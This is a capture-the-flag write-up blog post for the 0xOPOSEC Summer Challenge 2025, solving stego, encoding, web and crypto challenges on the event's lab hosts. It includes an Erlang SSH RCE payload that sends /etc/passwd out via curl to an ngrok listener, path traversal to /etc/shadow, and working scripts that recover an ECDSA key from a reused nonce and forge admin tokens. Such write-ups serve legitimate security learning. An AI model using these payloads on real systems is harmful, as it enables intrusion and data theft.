---
title: "0xOPOSEC Summer Challenge 2025"
date: 2025-10-01
draft: false
tags:
  - CTF
---

"Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group."

## Misc

### A Delicious Mess

{{< figure src="/oposec_2025/delicious.png" class="post-image" >}}

I downloaded the image and decided to throw it into binwalk to see if it had anything hidden. Good call, because binwalk revealed there was another image tucked inside the original one.

{{< figure src="/oposec_2025/delicious2.png" class="post-image" >}}

The file name was `12s.jpg`, which felt like a clue. I figured it probably meant I needed to extract it 12 times. After repeating the process 12 times, the flag finally popped out.

{{< figure src="/oposec_2025/delicious3.png" class="post-image" >}}

```bash
flag{are_u_full_y3t?}
```

### Matryoshka

{{< figure src="/oposec_2025/matry.png" class="post-image" >}}

The challenge gave us an URL, which redirected to a webserver spitting out a sequence of hex values.

{{< figure src="/oposec_2025/matry2.png" class="post-image" >}}

I tossed it into cyberchef and ran the magic recipe. With `from_hex('space').gunzip()`, the output looked like `brainfuck` code.

{{< figure src="/oposec_2025/matry3.png" class="post-image" >}}

Using that same recipe, I confirmed it was indeed Brainfuck. I saved the output and ran it through an online brainfuck interpreter, which gave me the next layer.

{{< figure src="/oposec_2025/matry4.png" class="post-image" >}}

{{< figure src="/oposec_2025/matry5.png" class="post-image" >}}

After a bit of googling, I realized it was `obfuscated JavaScript`. I ran it through an online JS interpreter and got yet another doll.

{{< figure src="/oposec_2025/matry6.png" class="post-image" >}}

This time it was `uuencoded`, so I threw it into an online decoder—and that finally revealed the flag.

{{< figure src="/oposec_2025/matry7.png" class="post-image" >}}

```bash
flag{Babushka!}
```

### Foreplay

{{< figure src="/oposec_2025/foreplay.png" class="post-image" >}}

I ran an nmap against the target range and found port 2222 open:

```
$ nmap -Pn -p1024-6667 madlabs.pw -v

PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
```

I then connected with netcat to see what it would do. After a while, I got this back:

```
$ nc 20.4.227.104 2222
asd
SSH-2.0-Erlang/5.1.4.7
Protocol mismatch.
```

I googled Erlang with the specific version and found [CVE-2025-32433](https://www.keysight.com/blogs/en/tech/nwvs/2025/05/23/cve-2025-32433-erlang-otp-ssh-server-rce) that contained a simple PoC to abuse this CVE.

Tweaking the payload showed I could call `os:cmd` — so instead of `file:write` (original PoC) I tried to use `os:cmd` while listening with `nc -lvnp 8281` + ngrok:

```
os:cmd("cat /etc/passwd | curl -X POST --data-binary @- http://ngrok:8281").
```

{{< figure src="/oposec_2025/foreplay2.png" class="post-image" >}}

I validated that `os:cmd` worked, so I went hunting for the flag in `/root`.

{{< figure src="/oposec_2025/foreplay3.png" class="post-image" >}}

{{< figure src="/oposec_2025/foreplay4.png" class="post-image" >}}

```bash
flag{OhBoyErlang}
```

## Web

### The Crew

{{< figure src="/oposec_2025/crew.png" class="post-image" >}}

I opened the site from the challenge and got presented with what looked like `the crew`.

{{< figure src="/oposec_2025/crew2.png" class="post-image" >}}

While poking around with Burp, I immediately spotted a `/flag` directory — but visiting it showed an admin-only restriction.

{{< figure src="/oposec_2025/crew3.png" class="post-image" >}}

{{< figure src="/oposec_2025/crew4.png" class="post-image" >}}


Looking in more detail into Burp, I found a `/get_users` endpoint that returned a JSON list of users and their passwords.

{{< figure src="/oposec_2025/crew5.png" class="post-image" >}}

I threw the password list at crackstation and only one matched.

{{< figure src="/oposec_2025/crew6.png" class="post-image" >}}

Using that password to log into the admin panel gave me the flag.

{{< figure src="/oposec_2025/crew7.png" class="post-image" >}}

```bash
flag{why_is_p1zz1_round?}
```

### You Are Not the Admin

{{< figure src="/oposec_2025/admin.png" class="post-image" >}}

Looking at the web page I could easily identify that this was using Next.js

{{< figure src="/oposec_2025/admin2.png" class="post-image" >}}

{{< figure src="/oposec_2025/admin3.png" class="post-image" >}}

I clicked `Go to protected area`, which routed me to `/admin` and immediately redirected to `/login`.

{{< figure src="/oposec_2025/admin4.png" class="post-image" >}}

{{< figure src="/oposec_2025/admin5.png" class="post-image" >}}

I searched for "Next.js auth bypass" and landed on a [Datadog writeup](https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/) that looked relevant - one section there jumped out as especially useful:

{{< figure src="/oposec_2025/admin6.png" class="post-image" >}}

So the blog post talks about an api and while checking console logs I noticed that there's an api present.

{{< figure src="/oposec_2025/admin7.png" class="post-image" >}}

Using the PoC available in the blog it's clear that it's possible to bypass the auth mechanism in the login form moving directly into the admin area.

{{< figure src="/oposec_2025/admin8.png" class="post-image" >}}

{{< figure src="/oposec_2025/admin9.png" class="post-image" >}}

Once inside the admin area, the only section that actually did anything was "Settings" — it took me to a page that let me read files directly from the server.

{{< figure src="/oposec_2025/admin10.png" class="post-image" >}}

Going for the low-hanging fruit, I tried an LFI attack to grab the flag and ended up with this:

{{< figure src="/oposec_2025/admin11.png" class="post-image" >}}

After a few failed attempts, I switched to a path traversal attack and successfully grabbed `/etc/passwd`:

{{< figure src="/oposec_2025/admin12.png" class="post-image" >}}

After a bit, I realized there were no users besides `root*` — with this in mind I checked `/etc/shadow` and that's where the flag was.

{{< figure src="/oposec_2025/admin13.png" class="post-image" >}}

```bash
flag{y0u_d1scov3red_the_P4TH}
```

### Take a Look in the Mirror !

{{< figure src="/oposec_2025/mirror.png" class="post-image" >}}

Exploring the provided URL, I stumbled upon a `/debug` directory that contained what looked like a Java stack trace, including some custom classes.

{{< figure src="/oposec_2025/mirror2.png" class="post-image" >}}

After some Slack hints pointing to Java reflection (Java reflection allows a program to inspect and manipulate classes, methods, and objects at runtime, even if they weren’t known at compile time) - which fit the challenge name - I realized I could invoke methods directly via the URL by specifying the className.

{{< figure src="/oposec_2025/mirror3.png" class="post-image" >}}

Looking back at the first 500 error in the `/debug` directory, I noticed a comment:

```
Exception in controller java.lang: Class c = Class.forName(className); // NormalUser
```

After some testing, I tried calling`http://madlabs.pw:8081/debug?className=com.opolabs.mirror.NormalUser` and got the following response:

{{< figure src="/oposec_2025/mirror4.png" class="post-image" >}}

With that in mind, I figured I might be able to call the same class for the administrator. After trying a few guesses, I found that `AdminUser` was the correct one.

{{< figure src="/oposec_2025/mirror5.png" class="post-image" >}}

```bash
flag{JavaReflectionForTheWin!}
```

## Crypto

### Sounds Frm Another Planet

{{< figure src="/oposec_2025/sounds.png" class="post-image" >}}

After grabbing the encrypted message file, its content contained only the letters `u`, `s`, `d`, and `p`.

{{< figure src="/oposec_2025/sounds2.png" class="post-image" >}}

At first, I thought it was a simple substitution cipher, but I wasn't getting anywhere.

After a few dead ends, I checked out https://dcode.fr/tools-list, which has a handy tool that can help identify the type of cipher.

{{< figure src="/oposec_2025/sounds3.png" class="post-image" >}}

I pasted the encrypted text into the tool, clicked analyze, and it suggested that the text is written in Deadfish.

{{< figure src="/oposec_2025/sounds4.png" class="post-image" >}}

That’s where I learned that Deadfish isn't really a cipher - it's an extremely simplified programming language with just a single memory cell and four basic operations.

{{< figure src="/oposec_2025/sounds5.png" class="post-image" >}}

By default, Deadfish only uses four letters: `i`, `s`, `d`, and `o`. But the provided message had `u`, `d`, `s`, and `p`, so I had to tweak it a bit.

To convert it into the standard Deadfish format, I applied the following transformations:
- `u` -> `i`
- `d` -> `d`
- `s` -> `s`
- `p` -> `o`

{{< figure src="/oposec_2025/sounds6.png" class="post-image" >}}

With the transformations applied, I pasted the result into the tool, decrypted it, and got the flag.

{{< figure src="/oposec_2025/sounds7.png" class="post-image" >}}

```bash
flag{my_n4m3_15_d3adf1sh}
```

### 2010

{{< figure src="/oposec_2025/date.png" class="post-image" >}}

Navigating to the provided URL, I landed on a page that said the flag would only be given to administrators.

{{< figure src="/oposec_2025/date2.png" class="post-image" >}}

While inspecting the traffic in Burp Suite, I noticed a JWT.

{{< figure src="/oposec_2025/date3.png" class="post-image" >}}

A simple Base64 decode showed that the JWT was a JSON object with two entries: "data" and "signature". Inside "data", there were two fields: "name" and "admin".

{{< figure src="/oposec_2025/date4.png" class="post-image" >}}

I tried changing "admin" from false to true, but that didn’t grant me admin rights. Another thing I noticed was that every time I pressed F5, the "name" in the JSON object changed, and it updated in the UI as well.

{{< figure src="/oposec_2025/date5.png" class="post-image" >}}

Seeing the challenge name, I suspected this might be an old crypto attack from around 2010. A quick search led me to this: https://github.com/elikaski/ECC_Attacks.

{{< figure src="/oposec_2025/date6.png" class="post-image" >}}

Reading through the GitHub repository, it seems that in 2010 Sony reused the same value of `k` in different ECDSA signatures for the PlayStation, leading to a vulnerability.

The formula to recover the private key when the same k is reused is as follows:

```
# k = ((m1 - m2) * modinv(s1 - s2, q)) % q

from Crypto.Util.number import inverse

# NIST P-256 (ECDSA)
q = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551

m1 = token1["message_hash"]
m2 = token2["message_hash"]
s1 = token1["s"]
s2 = token2["s"]
r = token1["r"]

# k
numerator = (m1 - m2) % q
denominator = (s1 - s2) % q
den_inv = inverse(denominator, q)
k = (numerator * den_inv) % q

k -> 115792089210356248762697446949407573529996955224135760342422259061068512044368
```

With some ChatGPT help I got the following resume about this vulnerability:

{{< figure src="/oposec_2025/date7.png" class="post-image" >}}

To solve this, I grabbed two JSON objects with signatures, which allowed me to extract the reused nonce `k` and ultimately recover the private key, assigning it to the variable `x`.

```python
import json
import base64
from hashlib import sha256
from Crypto.Util.number import inverse, bytes_to_long

# NIST P-256 order
q = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551

# Provided JWTs (Base64-encoded)
jwt1_b64 = "eyJkYXRhIjogIntcIm5hbWVcIjogXCJHYXJjaWFcIiwgXCJhZG1pblwiOiBmYWxzZX0iLCAic2lnbmF0dXJlIjogIjZiMTdkMWYyZTEyYzQyNDdmOGJjZTZlNTYzYTQ0MGYyNzcwMzdkODEyZGViMzNhMGY0YTEzOTQ1ZDg5OGMyOTZlMjg1OWViMjFiYWZmZmI5NWRlYjMyMDI3ODE0ODIxZTc3N2FmYzM1YjgxNjJkYmQ5Y2FjYTczNDlmNDcwNzk0In0="
jwt2_b64 = "eyJkYXRhIjogIntcIm5hbWVcIjogXCJHdWVycmVyb1wiLCBcImFkbWluXCI6IGZhbHNlfSIsICJzaWduYXR1cmUiOiAiNmIxN2QxZjJlMTJjNDI0N2Y4YmNlNmU1NjNhNDQwZjI3NzAzN2Q4MTJkZWIzM2EwZjRhMTM5NDVkODk4YzI5NmFkNDc5NDg0Yjk2NDFjNGEzMGY3MTM4NWM5ZDM2NDc2NWRlNzFiMjMwZTVmMDEyNDAwODkwZGUwM2U1OTdmZDAifQ=="

# Decode Base64 and parse JSON
jwt1 = json.loads(base64.b64decode(jwt1_b64))
jwt2 = json.loads(base64.b64decode(jwt2_b64))

# Function to convert signature hex to r and s
def sig_to_rs(sig_hex):
    sig_bytes = bytes.fromhex(sig_hex)
    r = bytes_to_long(sig_bytes[:32])
    s = bytes_to_long(sig_bytes[32:])
    return r, s

r1, s1 = sig_to_rs(jwt1["signature"])
r2, s2 = sig_to_rs(jwt2["signature"])

# Hash the "data" fields using SHA-256
m1 = int(sha256(jwt1["data"].encode()).hexdigest(), 16)
m2 = int(sha256(jwt2["data"].encode()).hexdigest(), 16)

# Compute k using the reused nonce formula
numerator = (m1 - m2) % q
denominator = (s1 - s2) % q
k = (numerator * inverse(denominator, q)) % q
print("Recovered k:", k)

# Recover private key x
x = ((s1 * k - m1) * inverse(r1, q)) % q
print("Recovered private key x:", x)
```

```
$ python3 extract_priv_key.py                                                                                                                                                                                
Recovered k: 115792089210356248762697446949407573529996955224135760342422259061068512044368
Recovered private key x: 102833336941926514149702482123358695820533145036475158825316379479287364480376 
```

Using the recovered private key, I put together a Python script to generate a valid JWT by signing it with the reused `x`.

```python
import json
import base64
from hashlib import sha256
from ecdsa import SigningKey, NIST256p
from ecdsa.util import sigencode_string

# private key
x = 102833336941926514149702482123358695820533145036475158825316379479287364480376

data = '{"name": "Lyons", "admin": true}'

sk = SigningKey.from_secret_exponent(x, curve=NIST256p, hashfunc=sha256)
sig = sk.sign(data.encode(), hashfunc=sha256, sigencode=sigencode_string)

r = int.from_bytes(sig[:32], 'big')
s = int.from_bytes(sig[32:], 'big')
signature_hex = f"{r:064x}{s:064x}"

token = {
    "data": data,
    "signature": signature_hex
}

token_b64 = base64.b64encode(json.dumps(token).encode()).decode()
print(token_b64)
```

```
$ python3 exploit.py                                                                                                                                                                                
eyJkYXRhIjogIntcIm5hbWVcIjogXCJMeW9uc1wiLCBcImFkbWluXCI6IHRydWV9IiwgInNpZ25hdHVyZSI6ICJmZTNlZWI3Zjc5NDY5YTJjYWQ0YTI0ODI3NjI4ODhhNTZjYTNmZDI1OTJmOWU2MmUyMDBkMzdkMjNlMTVkY2ZkYmRiNWQzMzdlNTVkYT
ZmYzhlZDBhM2QxYWQwYWE5YWMzZTBiNGI0NjU0YzdkNjQ0ZTRkYjJkMGQ2MTQ4ZWQzOCJ9
```

I tweaked the JWT in the web app, and that got me the flag.

{{< figure src="/oposec_2025/date8.png" class="post-image" >}}

```bash
flag{if_not_rand0m_why_rand0m_sh4ped?}
```


### Spicy

TBD

## Trivia

TBD

### Default

TBD

### The One

TBD

### A Sweet Evolution

TBD